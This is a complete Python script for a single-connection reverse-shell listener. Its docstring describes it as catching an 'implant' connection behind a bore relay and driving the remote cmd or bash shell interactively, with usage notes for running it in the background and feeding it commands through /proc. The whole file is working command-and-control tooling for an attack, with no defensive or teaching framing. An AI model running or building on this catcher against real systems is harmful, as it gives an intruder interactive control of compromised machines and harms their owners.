#!/usr/bin/env python3
"""Single-connection reverse-shell catcher for use behind a bore relay.

Listens on 0.0.0.0:40000, accepts ONE connection (the implant's), then drives
the remote cmd/bash interactively from stdin lines. Output streams to stdout.

Usage (background):
    python3 -u catcher.py < <(sleep infinity)

Send a command to the live session:
    echo 'whoami' > /proc/<catcher_pid>/fd/0

Read output: poll the background process's logs.
"""
import socket, threading, sys, time

HOST, PORT = "0.0.0.0", 40000

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind((HOST, PORT))
srv.listen(1)
print("catcher listening on %d" % PORT, flush=True)
conn, addr = srv.accept()
print("PEER CONNECTED:", addr, flush=True)

def reader():
    try:
        while True:
            d = conn.recv(65536)
            if not d:
                print(">>> PEER CLOSED", flush=True)
                return
            sys.stdout.write(d.decode(errors="replace"))
            sys.stdout.flush()
    except Exception as e:
        print(">>> read err", e, flush=True)

threading.Thread(target=reader, daemon=True).start()

for line in sys.stdin:
    line = line.strip()
    if not line:
        continue
    if line == "!exit":
        break
    try:
        conn.sendall((line + "\r\n").encode())
    except Exception as e:
        print(">>> send err", e, flush=True)
        break
    time.sleep(0.3)
